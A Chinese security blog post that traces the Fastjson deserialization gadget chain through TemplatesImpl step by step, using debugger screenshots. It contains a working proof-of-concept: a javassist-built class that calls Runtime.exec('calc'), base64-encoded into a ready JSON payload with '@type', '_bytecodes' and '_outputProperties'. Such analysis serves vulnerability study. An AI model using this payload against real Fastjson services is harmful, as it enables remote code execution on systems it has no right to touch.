---
title: Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析
tags:
  - fastjson
  - 反序列化
  - gadgets
  - templateImpl
categories:
  - - 漏洞分析
abbrlink: 4187a059
date: 2025-04-14 10:33:52
---
@[TOC](Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析)

我们知道Fastjson在进行序列化的时候会调用当前类的所有getter方法去获取所有public成员变量的值，像这样：
```java
package com.armandhe.javabase;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonTest {
    public static void main(String[] args) {
        FastjsonUnserilizeTest fastjsonUnserilizeTest = new FastjsonUnserilizeTest();
//        fastjsonUnserilizeTest.setAge(20);
//        fastjsonUnserilizeTest.setName("armandhenewpy");
        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);
        System.out.println(s);
//        String s1 = "{\"@type\":\"com.armandhe.javabase.FastjsonUnserilizeTest\",\"age\":20,\"name\":\"armandhenewpy\"}";
//        JSONObject jsonObject = JSON.parseObject(s1);
//        System.out.println(jsonObject);
    }
}
```
<!--more-->
上面代码对FastjsonUnserilizeTest类的一个对象进行了序列化，这将会调用FastjsonUnserilizeTest中的所有getter。最终的结果为：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/1db44ff51eb95e9d8a305037594671d8.png)
可以看到调用了getter，我们FastjsonUnserilizeTest类的代码是这样写的：
```java
package com.armandhe.javabase;

public class FastjsonUnserilizeTest {
    private String name;
    private int age;

    public String getName() {
        System.out.println("调用了getname方法！");
        return name;
    }

    public void setName(String name) {
        System.out.println("调用了setname方法！");
        this.name = name;
    }

    public int getAge() {
        System.out.println("调用了getage方法！");
        return age;
    }

    public void setAge(int age) {
        System.out.println("调用了setage方法！");
        this.age = age;
    }
}

```
可以看到age的初始值为0，符合我们的输出。
我们在看下面的代码：
```java
package com.armandhe.javabase;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonTest {
    public static void main(String[] args) {
        FastjsonUnserilizeTest fastjsonUnserilizeTest = new FastjsonUnserilizeTest();
//        fastjsonUnserilizeTest.setAge(20);
//        fastjsonUnserilizeTest.setName("armandhenewpy");
//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);
//        System.out.println(s);
        String s1 = "{\"@type\":\"com.armandhe.javabase.FastjsonUnserilizeTest\",\"age\":20,\"name\":\"armandhenewpy\"}";
        Object parse = JSON.parse(s1);
        System.out.println(parse);
    }
}
```
这时候的输出为：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6ae3d41db6032e545a2d41f6cd3306b8.png)
看到反序列化的时候只调用了所有setter，我们将代码变化一下：
```java
package com.armandhe.javabase;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonTest {
    public static void main(String[] args) {
        FastjsonUnserilizeTest fastjsonUnserilizeTest = new FastjsonUnserilizeTest();
//        fastjsonUnserilizeTest.setAge(20);
//        fastjsonUnserilizeTest.setName("armandhenewpy");
//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);
//        System.out.println(s);
        String s1 = "{\"@type\":\"com.armandhe.javabase.FastjsonUnserilizeTest\",\"age\":20,\"name\":\"armandhenewpy\"}";
        JSONObject jsonObject = JSON.parseObject(s1);
        System.out.println(jsonObject);
    }
}
```
此时的输出为：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0f871300306c9def040ce2a9d60ff77f.png)
观察到使用parseObject方法进行反序列化比使用parse方法进行发序列化额外调用了所有的getter方法。这是应为parseObject方法是对parse方法的再一次封装。parse反序列化生成的是一个Object对象，而parseObject却是一个JsonObject对象，正是这个角色的装换使得parseObject多调用了一次所哟逇getter方法。
我们的TemplateImpl利用链条也就是利用了parseObject的这一点。我们可以跟一下parseObject方法，最后跟到了：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e64c07bafaec2456193b65a3a30b034c.png)
这个方法首先调用了parse进行反序列化得到一个Object对象，然后是一个三元运算法，判断obj是否是JSONObject的实例，很明显不是的，所以会调用toJSON方法，继续跟到toJSON方法里面：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c9ad0b9063671b41ca96d2601723db5f.png)
调用了重载方法，继续跟到了这一步：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/20b1cb2630c86569dddb4d26e33d4c6b.png)
此时查看值：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0a7c061ea34cc5dfacff44acb6d61e51.png)
发现已经获得了所有的getter，跟到getFieldValuesMap方法里面去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/47ddde20e74f4158fc36b2fc5714a65a.png)
可以看到age与name的值被取出来了，这里肯定已经调用了getter方法了，看淡上面有个getter.getPorpertyValue方法比较可以，这个应该就是获取值得方法，跟进去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/102d2742a5cb87d304247b8fe38b58db.png)
果然这里获取到了age的值。
从上面的过程来看，parseObject方法在调用的时候会调用toJSON方法将Object类型转换为JSONObject类型，在这个过程中会调用所有的getter方法。这个我们的利用链成立的前提。
我满来看一下我们最终利用的payload:
```java

package com.armandhe.javabase;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.alibaba.fastjson.util.JavaBeanInfo;
import sun.misc.Launcher.*;
import java.lang.ClassLoader;

import org.apache.commons.codec.binary.Base64;

public class FastjsonTemplatesImplPoc {
    public static class evilCode{}

    public static void main(String[] args) throws ClassNotFoundException, NotFoundException, CannotCompileException {
        ClassPool aDefault = ClassPool.getDefault();
        CtClass ctClass = aDefault.get(evilCode.class.getName());
        String s = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        ctClass.makeClassInitializer().insertBefore(s);
        String RandomClassName = "armandhe"+System.nanoTime();
        ctClass.setName(RandomClassName);
        ctClass.setSuperclass((aDefault.get(AbstractTranslet.class.getName())));
        try {
            byte[] bytes = ctClass.toBytecode();
            String s1 = Base64.encodeBase64String(bytes);
//            System.out.println(s1);
            final String DESERILIZATION_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String jsonString = "{"+
                    "\"@type\":\"" + DESERILIZATION_CLASS +"\","+
                    "\"_bytecodes\":[\""+s1+"\"],"+
                    "'_name':'a.b',"+
                    "'_tfactory':{ },"+
                    "'_outputProperties':{ }"+
                    "}\n";
//            System.out.println(jsonString);
            ParserConfig parserConfig = new ParserConfig();
//            TemplatesImpl templates = new TemplatesImpl();
//            System.out.println(JSON.toJSONString(templates, SerializerFeature.WriteClassName));
            Object o = JSON.parseObject(jsonString, Object.class, parserConfig, Feature.SupportNonPublicField);

        } catch (Exception e){
            e.printStackTrace();
        }
    }
}


//或者使用下面这个POC

//import com.sun.org.apache.xalan.internal.xsltc.DOM;
//import com.sun.org.apache.xalan.internal.xsltc.TransletException;
//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//
//import java.io.IOException;
//
//public class Test extends AbstractTranslet {
//    public Test() throws IOException {
//        Runtime.getRuntime().exec("calc");
//    }
//
//    @Override
//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
//    }
//
//    @Override
//    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
//
//    }
//
//    public static void main(String[] args) throws Exception {
//        Test t = new Test();
//    }
//}

```
核心部分就是jsonString这一部分：
```java
"{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}";
```

- @type 表示需要将给字符串反序列化为什么类型
- _bytecodes 就是执行命令的payload，其实就是
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
```
转换为字节码再进行base64编码

- _name 
- _tfactory
- _outputProperties ，这就是我们的漏洞入口了，因为在反序列化过程中调用了该属性的getter方法，即getOutputProperties方法。

接下来我们跟踪一下这个方法。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f7a1b4cb0394e0312665e69c8aa17559.png)
调用了newTransformer方法，跟进：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a940036dea76980597a5d109b591486b.png)

调用getTransletInstance方法，跟进：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/18825b7b412709fa4a714e7676637a18.png)
这里对_name的值进行了判断，不能为空，为空直接return了，而_name的默认值为空：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/dee7b98cf6f97d60ac4fd613d2dddfcd.png)
所以我们构造poc的时候需要为_name赋值。
然后要保证_class为null，刚好其默认值就位null，所以我们不用管他，然后就执行了defineTransletClasses方法，这里出现了defineClass类似的关键字，我第一反应就是Java类加载时的defineClass方法，将字节码装换为一个Class实例。想来这各函数和defineClass函数功能一样，我们继续往下看，到了这一步：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e7d839663b4709b41f3c71a44141481c.png)
调用了getConstructor方法然后继续调用了newInstance方法，这是什么？这是通过反射调用构造方法实例化一个对象啊，那么我们只需要将我们的恶意代码卸载恶意类的构造方法里面就好了。这时候就回到了_class[_transletIndex]的值得为一个Class实例对象。且该实例化对象代表的类继承了AbstractTranslet类，因为这儿有个强制类型转换。那么这个_class[_transletIndex]从哪来
呢。我们跟进defineTransletClasses方法。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/4eeedc02d3106571d951b121eef661da.png)
首先判断了_bytecodes是否为空，这当然是不能为空的了，因为我们会控制他的值，所以接下来流程往下走加载了一个loader，是一个自定义的类加载器，里面应该重写了findclass方法实现了自己的类加载方法，接着往下计算了_bytecodes的长度为classCount，不出意外这里等于1。然后new了一个Class数组赋值给_class。然后判断classCount的值是否大于1，当然是不大于了，然后进入for循环，把第一个字节数据取出来调用defineClass方法生成一个Class实例对象。然后获取该Class对象的父类，判断其是否等于ABSTRACT_TRANSLET，这个常量的值我们跟一下：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/37cde3d936f2a5017a4c3d0c9a1b4f26.png)
正好是AbstractTranslet类，和我们上面分析的一致，我们需要让我们的恶意类集成AbstractTranslet类。然后为_transleetIndex复赋值为0。defineTranslet调用完毕后就是实例化对象执行构造方法了。

但是这里有一个疑问，我们传给_bytecodes的代码是base64编码的，那么在执行过程中，肯定有哪一步实现了解码的操作，这个我们要从头开始看。
我们的poc中使用的反序列化函数是这个：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/2506c24576472c96e0251e20ebe6eb1e.png)
其中jsonString就是我们穿进去的payload，我们跟一下这个parseObject方法：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f063a10dc4a3a989c771b7202d472fe8.png)
调用了重载方法，继续跟：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/21be525054f6eacbb38b83131c73b952.png)

跟到了这里注意有两个关键的地方，一个是第一个箭头处生成了一个JSON解析器对象，一个是第二个箭头处调用的parseObject方法，我们先跟第二个箭头：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/679d84dab4f64ffc90b42c06ba0f635b.png)
进去后看到又一个token的判断，这个后面再将，最后到调用getDeserializer方法，获取一个反序列化器，然后调用其deerialze方法，跟到方法里面：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a08f58da592247915b64ee616dfc21e6.png)
注意到最后return处的三元运算符，判断type是否为Class实例，并且不是Object.Class实例，并且不是Serializable.Class实例，这个判断为否，所以最后执行了parser.parser方法，跟进去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e464c93696f3b3b0857384cd5d1f3be5.png)
这里有大块的语句对lexer.token的值尽心判断，那么这个值为多少呢？我们需要回到前面的步骤：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a4c70ef479481c8497a1ad8c5093c84c.png)
跟进这个新建解析器的操作：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/97befd5b67a280e376c3346558e06c0c.png)
调用了构造方法：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/4fb8bbf9a4cbf45602511d6cfac43106.png)
this.lexer在这儿被赋值，形参lexer是一个JSONScanner对象由上一步传进来。然后执行lexer.getcurrent方法，看看他干了什么：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f42e03f693cc4efbfc16f5b6fb6bdd48.png)
反回了this.ch的值，这个值当前为{ 看看这个值怎么获取的，该值是在创建JSONScanner对象时再构造方法中赋值的，跟进去：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/afe015a247f576402a14867fe2a58e19.png)
继续跟到this.next里面:
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7e721ed2548ac42df0d2e96570444dfd.png)
这里看到有一个三元运算符，如果当前的index大于this.len则为this.ch赋值为\u001a，否则计算this.text在index处的字符赋值给this.ch。this.len 与 this.text在上一级函数赋值，分别为input与input的长度，而input就是我们的输入的pauload。所以最开始获取到的this.ch为 { 后面每调用一次this.getcurrent就是调用一次this.next获取下一个字符的值，这时候我们返回到getcurrent的调用处：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ecb5ba3b4262d1036a53ec92d6d5357f.png)

ch ==‘{’成立，然后获取下一个字符，并把token设置为12。
以上就是token的由来，然后我们回到parse函数，找到case 12：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c80db5f1bc10df5d5d7b112bb9ab0636.png)
跟到this.parseObject里面：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6b132329d9a05c2df08cc4e075cc9b67.png)
一步步调试最后到了第二个红箭头处，判断第二个ch是否为" ,当然是的，我们让调试过程强制跳转到第176行：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/3d5c85e5f6fbb39267499e1d386e64da.png)
这里获取了key的值，但是我们不知道是多少，再前进一步：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/419ec316e45994ee75282e83ef275758.png)
这不就有了吗，key就是@type，继续单步往下走就到了这儿：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/23da7cbb241829c5c2aaca5ca2465275.png)
判断key是否等于JSON.DEFAULT_TYPE_KEY，看看这个常量是多少：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/1e01dda8b1c061a4fce244eaab0bb788.png)
证明是相等的。第二个条件就不跟了。然后进入到if判断里面获取了ref，走到他的下一步看看ref等于多少，不幸的是，调试的时候没看到，那只能去看看lexer.scanSymbol干了什么了，这个和获取key值得方法一样，我猜就是获取@type的值：
没跟到，哈哈尴尬！！！！！直接跳过，范湖IDE就是@type的值：
然后就调用了loadClass函数，这个.....，不就是要准备加载类了吗，我们进去看看：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/13c3654464cee3c403c0a1227a229ffe.png)
果然，第一个参数是类名，第二个参数是类加载器，我们传进来的是默认类加载器也就是系统类加载器。首先判断clazz是否为空，当然不为空，然后判断类名第一个字符是否是[，当然也不是，然后判断是否以L开头，当然也不是，都不是之后判断类加载器是否为空，当然不是，然后调用系统类加载器的loadClass方法加载了我们的恶意TemplataImpl类并返回。到这里我们就获得了TemplateImpl类的Class实例对象了。然后就是通过反射机制获得类名、字段之类的一系列值了。然后单步向下来到这里：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9f73cac0c741f9b7a555c7727aa9890f.png)
跟进去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/54fc5f878379efa07b945d4ab82e8366.png)

调用重载方法，继续跟：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c6b127bec0b43f2432ab9716db80349a.png)
还是重载，继续：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0b6053e5d2e6ba965c51337978ba4982.png)
然后来到了这里，单步向下到这里：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/dfc7531499a7428d38c9c68857ed7f7d.png)

到367行已经获取到了outputProperities的值了
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/b72d99e660b80bcfe797a6e6b73468cc.png)
看看他怎么来的，最后定位到底63行，在构造方法中被赋值：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/62a76338ff33d2d8182905a2475a49ce.png)
那就看看在哪创建的吧，返回到上一层，当然是在这儿：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d1342d5949c6380b5bfdc33abfabcb23.png)
进到getDeserializer方法里面：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/84d5091d7fb87ddd235d21d8ee9fa7b2.png)
跟进这一步，单步到这儿：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/3a3a70dd76788ffe1f9496e814d1c5da.png)
继续跟进去，定位到这儿：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5a3b8cb3c6aadb5a6cccbff31a0be4e9.png)
继续跟进去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6e91952f5d4c63dcada2109957040447.png)

这里获取了所有的属性与方法，继续向下到这儿：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/50f3c6e52debaacd230984e5f166a384.png)
判断方法名是否长度大于4，因为有get与set嘛，不能是静态方法，返回值不能为void，或者返回值为自身的类，继续向下判断是否set开头。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/16fef496cf1fc4b119efb2eb7b3b668a.png)
这个最后有一个add方法获得了所有的属性放到fieldList里面
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7f7989d251cb1a7d61acc64a89fa6735.png)
通过同样的方法获得get方法的属性：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7b646c4806f06aad7cfadc5270791a03.png)
最终返回一个JavaBeanInfo对象，里面就有outputProperties则值了：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ec5fcba7df48c9af84f46331892f8dc4.png)
然后继续向下：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/dca9c0ffd21e2e2c7835c0d0c2cb313d.png)
跟进去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ae9ee75446203cd8576d24a42b85704e.png)
继续跟：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a0d24d9b5d3bf931ef0b112c6bce3570.png)
到这儿后，判断_bytecodes第一个字符是不是_，如果是则替换为空，到最后返回一个fieldDeserializer：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/822d25190bc4b113d757a827db2f4e4b.png)
执行完后到这儿，反正我是没有跳过去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d3215dd01bbd53746fc3e26adf1b66cd.png)

进去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/da541b6fc0351c2fccfda9e480cb0b7d.png)

这儿实例化了一个对象，会调用构造方法，跟进去就到了这里：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/74de1d2ca82ad454088850b963d7ff36.png)
后面的过程就和我们开始的分析一样了，完整的调用栈：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a35f9036a8fd9caeeb4c5e8b3f1d88cd.png)
说道这里还是没有讲为什么要base64编码，也是原作者锅，狗头保命。当token等于4的时候，会调用lexer.bytesValue
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/432d562f7dec5775315372382631e7fc.png)
我们知道lexer对象是通过JSONScanner生成的，所以我们要到JSONScanner类里面去找bytesValue：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/930a4b463d3a7cd04ca8c2fc6c8a8d58.png)
这里调用了base64的解码函数。
最后跟的有点水，因为我也有点没有跟明白！！！！

